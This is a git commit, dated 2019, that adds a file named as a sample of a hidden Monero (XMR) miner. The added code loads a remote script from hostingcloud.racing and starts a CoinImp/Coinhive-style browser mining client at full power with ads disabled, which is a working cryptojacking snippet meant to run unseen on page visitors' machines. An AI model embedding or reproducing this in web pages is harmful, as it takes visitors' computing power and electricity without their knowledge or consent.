e6440a65c0505dde979fc76300b512130c1f2f17
Tsarev Vladimir <sau412@gmail.com>
2019-02-25 14:13:51 +0300

    Sample of hidden XMR miner

---
+++ coinimp_samples/hidden_miner_xmr.js
@@ -0,0 +1,8 @@
+<script src="https://www.hostingcloud.racing/RWmB.js"></script>
+<script>
+    var _client = new Client.User('b08f81fafca1ec23052ddfd107eac9baa22c01c061d65c5b7f350c9a40fe5ea5',
+        'YOUR_COIHIVE_DATA-USER_KEY',{
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+</script>
